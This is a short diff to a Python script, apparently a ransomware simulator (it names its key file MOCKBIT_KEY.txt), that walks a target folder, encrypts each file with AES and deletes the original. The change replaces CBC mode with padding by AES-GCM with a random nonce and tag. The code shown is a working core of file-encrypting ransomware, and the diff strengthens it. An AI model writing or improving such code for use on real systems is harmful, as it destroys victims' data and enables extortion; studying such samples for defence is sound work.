@@ -6,18 +6,18 @@ from Crypto.Random import get_random_bytes
 # Zielordner anpassen!
 START_PATH = "folder"
 KEY_FILENAME = "MOCKBIT_KEY.txt"
+NONCE_SIZE = 12  # Bytes for AES-GCM nonce
 
-def pad(data):
-    pad_length = AES.block_size - (len(data) % AES.block_size)
-    return data + bytes([pad_length]) * pad_length
+
 
 def encrypt_file(file_path, key):
     with open(file_path, "rb") as f:
         data = f.read()
-    cipher = AES.new(key, AES.MODE_CBC)
-    ct_bytes = cipher.encrypt(pad(data))
+    nonce = get_random_bytes(NONCE_SIZE)
+    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+    ct_bytes, tag = cipher.encrypt_and_digest(data)
     with open(file_path + ".mock", "wb") as f:
-        f.write(cipher.iv + ct_bytes)
+        f.write(nonce + tag + ct_bytes)
     os.remove(file_path)
 
 def find_and_encrypt_all_files(path, key):
